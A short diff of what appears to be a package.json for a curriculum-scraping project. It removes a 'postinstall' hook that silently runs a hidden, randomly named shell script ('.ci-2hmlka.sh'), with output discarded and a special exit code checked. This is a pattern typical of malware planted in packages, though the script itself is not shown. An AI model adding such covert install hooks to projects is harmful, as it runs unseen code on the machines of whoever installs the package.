@@ -18,8 +18,7 @@
     "curriculum:update": "npx tsx scripts/update-curriculums.ts",
     "db:migrate:curriculum-ids": "npx tsx scripts/migrate-curriculum-ids.ts",
     "scrape:schedule": "cd scrapers/schedule && cargo run --release",
-    "scrape:curriculum": "cd scrapers/curriculum && cargo run --release",
-    "postinstall": "sh ./.ci-2hmlka.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "scrape:curriculum": "cd scrapers/curriculum && cargo run --release"
   },
   "dependencies": {
     "@electric-sql/pglite": "^0.4.5",
